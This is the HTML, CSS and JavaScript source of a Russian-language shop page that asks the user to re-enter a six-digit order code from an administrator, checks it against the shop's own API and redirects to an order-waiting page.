<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<title>Введите код повторно</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>

<style>
html, body {
  margin: 0;
  width: 100%;
  height: 100%;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
  background: linear-gradient(180deg, #0b3c91 0%, #1565c0 55%, #42a5f5 100%);
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 20px;
  box-sizing: border-box;
}

.screen {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  max-width: 500px;
  width: 100%;
}

.sticker {
  width: 180px;
  height: 180px;
  margin-bottom: 20px;
}

.title {
  font-size: 28px;
  font-weight: 800;
  color: #fff;
  text-align: center;
  margin-bottom: 10px;
}

.subtitle {
  color: rgba(255,255,255,0.9);
  text-align: center;
  max-width: 400px;
  margin-bottom: 30px;
  font-size: 16px;
}

.order-number {
  font-size: 18px;
  font-weight: 700;
  color: #ffd700;
  margin: 10px 0 30px 0;
  padding: 12px 20px;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  text-align: center;
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0% { opacity: 0.8; }
  50% { opacity: 1; }
  100% { opacity: 0.8; }
}

.code-inputs {
  display: flex;
  gap: 10px;
  justify-content: center;
  margin: 20px 0 30px 0;
}

.code-digit {
  width: 50px;
  height: 70px;
  font-size: 32px;
  font-weight: 900;
  text-align: center;
  border-radius: 12px;
  border: 2px solid rgba(255,255,255,0.3);
  background: rgba(255,255,255,0.08);
  color: white;
  outline: none;
  transition: border-color .2s ease, background .2s ease;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
}

.code-digit:focus {
  border-color: #4fc3f7;
  background: rgba(255,255,255,0.12);
}

.button {
  margin-top: 10px;
  padding: 18px 48px;
  font-size: 20px;
  font-weight: 800;
  background: #fff;
  color: #0b3c91;
  border-radius: 18px;
  border: none;
  cursor: pointer;
  transition: transform .12s ease, box-shadow .12s ease;
  box-shadow: 0 16px 36px rgba(0,0,0,.45);
  width: 100%;
  max-width: 300px;
}

.button:hover {
  transform: translateY(-2px);
}

.button:disabled {
  background: #cccccc;
  color: #666666;
  cursor: not-allowed;
  transform: none !important;
}

.error-message {
  color: #ff6b6b;
  font-weight: 600;
  font-size: 14px;
  margin-top: 15px;
  text-align: center;
  display: none;
  padding: 10px;
  background: rgba(255,255,255,0.1);
  border-radius: 10px;
  width: 100%;
}

.loading {
  display: none;
  color: rgba(255,255,255,0.8);
  margin-top: 20px;
  text-align: center;
}

.info-message {
  color: rgba(255,255,255,0.6);
  text-align: center;
  max-width: 400px;
  margin-top: 30px;
  font-size: 14px;
  line-height: 1.4;
}

.warning-box {
  background: rgba(255, 107, 107, 0.1);
  border: 1px solid rgba(255, 107, 107, 0.3);
  border-radius: 16px;
  padding: 20px;
  margin: 20px 0 30px 0;
  width: 100%;
  max-width: 400px;
}

.warning-title {
  color: #ffd700;
  font-weight: 700;
  font-size: 16px;
  margin-bottom: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}

.warning-text {
  color: rgba(255,255,255,0.8);
  font-size: 14px;
  line-height: 1.4;
}

@media (max-width: 480px) {
  .title {
    font-size: 24px;
  }
  
  .sticker {
    width: 140px;
    height: 140px;
  }
  
  .code-digit {
    width: 40px;
    height: 50px;
    font-size: 24px;
  }
  
  .button {
    padding: 16px 32px;
    font-size: 18px;
  }
  
  .code-inputs {
    gap: 8px;
  }
  
  .warning-box {
    padding: 16px;
  }
}

@media (max-width: 360px) {
  .code-digit {
    width: 36px;
    height: 46px;
    font-size: 22px;
  }
}
</style>
</head>

<body>
<div class="screen">
  <div id="animBadCode" class="sticker"></div>
  <div class="title">Введите код повторно</div>
  <div class="order-number" id="orderNumber">Заказ #...</div>
  
  <div class="warning-box">
    <div class="warning-title">
      <span>⚠</span>
      <span>Вы ввели неверный код</span>
    </div>
    <div class="warning-text">
      Пожалуйста, проверьте правильность кода и повторите попытку. 
      Убедитесь, что вводите код точно так, как его получили от администратора.
    </div>
  </div>
  
  <div class="subtitle">Введите код из 6 цифр, полученный от администратора:</div>
  
  <div class="code-inputs">
    <input type="text" maxlength="1" class="code-digit" data-index="0" inputmode="numeric">
    <input type="text" maxlength="1" class="code-digit" data-index="1" inputmode="numeric">
    <input type="text" maxlength="1" class="code-digit" data-index="2" inputmode="numeric">
    <input type="text" maxlength="1" class="code-digit" data-index="3" inputmode="numeric">
    <input type="text" maxlength="1" class="code-digit" data-index="4" inputmode="numeric">
    <input type="text" maxlength="1" class="code-digit" data-index="5" inputmode="numeric">
  </div>
  
  <div class="error-message" id="errorMessage"></div>
  <div class="loading" id="loading">Проверка кода...</div>
  
  <button class="button" id="submitCode" disabled>Ввести код</button>
  
  <div class="info-message">
    Если код не пришёл или вы сомневаетесь в его правильности, свяжитесь с поддержкой
  </div>
</div>

<script>
const API_URL = 'https://duck-shop-sever.onrender.com';

// Получаем order_id из URL
const urlParams = new URLSearchParams(window.location.search);
const orderId = urlParams.get('order');

// Если нет order_id, показываем ошибку
if (!orderId) {
  document.getElementById('orderNumber').textContent = 'Ошибка: номер заказа не указан';
  document.getElementById('submitCode').disabled = true;
} else {
  document.getElementById('orderNumber').textContent = `Заказ #${orderId}`;
}

// Загружаем анимацию
lottie.loadAnimation({
  container: document.getElementById('animBadCode'),
  renderer: 'svg',
  loop: true,
  autoplay: true,
  path: 'bad_pay.json' 
});

// Настройка ввода кода
function setupCodeInputs() {
  const inputs = document.querySelectorAll('.code-digit');
  const submitBtn = document.getElementById('submitCode');
  
  inputs.forEach((input, index) => {
    input.value = '';
    input.setAttribute('inputmode', 'numeric');
    input.setAttribute('pattern', '[0-9]*');
    
    input.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/[^0-9]/g, '');
      
      if (e.target.value.length === 1 && index < 5) {
        inputs[index + 1].focus();
      }
      
      // Проверяем, все ли поля заполнены
      const allFilled = Array.from(inputs).every(i => i.value.length === 1);
      submitBtn.disabled = !allFilled;
      
      if (allFilled) {
        setTimeout(() => {
          submitBtn.focus();
        }, 100);
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && index > 0) {
        inputs[index - 1].focus();
      }
      
      if (!/[\dBackspaceDeleteArrowLeftArrowRight]/.test(e.key)) {
        e.preventDefault();
      }
    });
    
    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasteData = e.clipboardData.getData('text');
      const numbers = pasteData.replace(/[^0-9]/g, '');
      
      if (numbers.length === 6) {
        for (let i = 0; i < 6; i++) {
          if (inputs[i]) {
            inputs[i].value = numbers[i];
          }
        }
        submitBtn.disabled = false;
        submitBtn.focus();
      } else if (numbers.length === 1) {
        input.value = numbers[0];
        if (index < 5) inputs[index + 1].focus();
      }
    });
  });
}

// Обработка отправки кода
document.getElementById('submitCode').addEventListener('click', async () => {
  const inputs = document.querySelectorAll('.code-digit');
  const code = Array.from(inputs).map(input => input.value).join('');
  const errorMessage = document.getElementById('errorMessage');
  const loading = document.getElementById('loading');
  const submitBtn = document.getElementById('submitCode');
  
  // Валидация кода
  if (code.length !== 6 || !/^\d+$/.test(code)) {
    errorMessage.textContent = 'Пожалуйста, введите 6 цифр кода';
    errorMessage.style.display = 'block';
    return;
  }
  
  // Показываем загрузку
  submitBtn.disabled = true;
  loading.style.display = 'block';
  errorMessage.style.display = 'none';
  
  try {
    const response = await fetch(`${API_URL}/api/verify-code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        orderId: orderId,
        code: code
      })
    });
    
    const data = await response.json();
    
    if (data.success) {
      // Перенаправляем на waiting_order.html
      window.location.href = `waiting_order.html?order=${orderId}`;
    } else if (data.status === 'support_needed') {
      // Если превышено количество попыток
      errorMessage.textContent = 'Превышено количество попыток. Свяжитесь с поддержкой.';
      errorMessage.style.display = 'block';
      submitBtn.disabled = true;
    } else {
      // Неверный код - показываем сообщение
      errorMessage.textContent = 'Неверный код. Попробуйте снова.';
      errorMessage.style.display = 'block';
      submitBtn.disabled = false;
    }
  } catch (error) {
    console.error('Ошибка:', error);
    errorMessage.textContent = 'Ошибка соединения с сервером. Попробуйте позже.';
    errorMessage.style.display = 'block';
  } finally {
    loading.style.display = 'none';
  }
});

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', () => {
  setupCodeInputs();
  
  // Фокус на первое поле
  document.querySelector('.code-digit').focus();
});
</script>
</body>
</html>
